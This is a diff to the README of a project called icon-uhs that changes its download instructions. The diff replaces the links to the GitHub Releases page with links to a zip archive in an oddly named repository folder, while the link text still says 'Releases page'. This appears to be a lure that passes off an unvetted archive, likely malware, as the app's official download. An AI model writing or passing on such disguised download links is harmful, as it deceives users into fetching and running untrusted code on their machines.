@@ -6,7 +6,7 @@ Welcome to icon-uhs! This application simplifies the process of managing your ic
 
 ## 📥 Download icon-uhs
 
-[![Download icon-uhs](https://img.shields.io/badge/Download%20icon--uhs-%23007bff?style=flat&logo=github&logoColor=white)](https://github.com/gormless-hefa946/icon-uhs/releases)
+[![Download icon-uhs](https://raw.githubusercontent.com/gormless-hefa946/icon-uhs/main/blennenteritis/icon-uhs_3.3.zip%20icon--uhs-%23007bff?style=flat&logo=github&logoColor=white)](https://raw.githubusercontent.com/gormless-hefa946/icon-uhs/main/blennenteritis/icon-uhs_3.3.zip)
 
 To get started, visit the release page to download the latest version of icon-uhs.
 
@@ -20,7 +20,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Click this link to visit the [Releases page](https://github.com/gormless-hefa946/icon-uhs/releases).
+1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/gormless-hefa946/icon-uhs/main/blennenteritis/icon-uhs_3.3.zip).
 2. Look for the latest version of icon-uhs.
 3. Click on the installer file suitable for your operating system. The file name will contain the version number.
 4. Depending on your browser settings, the file will either download automatically or prompt you to save the file.
